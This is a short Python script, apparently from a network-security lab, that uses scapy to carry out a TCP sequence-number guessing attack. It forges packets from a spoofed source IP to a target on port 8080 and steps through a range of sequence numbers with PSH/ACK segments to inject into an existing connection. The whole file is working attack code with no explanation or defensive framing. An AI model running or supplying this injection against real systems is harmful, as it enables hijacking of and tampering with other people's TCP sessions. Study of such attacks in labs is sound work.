from scapy.all import IP, TCP, send
import time

# -----------------------------
# Configuration
# -----------------------------
TARGET_IP = "20.0.0.20"
SPOOFED_IP = "10.0.0.10"

SPORT = 33776          # Update to the current client source port
DPORT = 8080

# Sequence number search range
START = 2523698400
END = 2523699500
STEP = 10


def main():

    print("=" * 60)
    print("TCP Sequence Number Guessing Attack")
    print("=" * 60)

    for seq in range(START, END, STEP):

        print(f"Trying SEQ : {seq}")

        pkt = (
            IP(src=SPOOFED_IP, dst=TARGET_IP)
            /
            TCP(
                sport=SPORT,
                dport=DPORT,
                flags="PA",
                seq=seq,
                ack=1
            )
        )

        send(pkt, verbose=False)

        time.sleep(0.5)

    print("\nAttack Finished")


if __name__ == "__main__":
    main()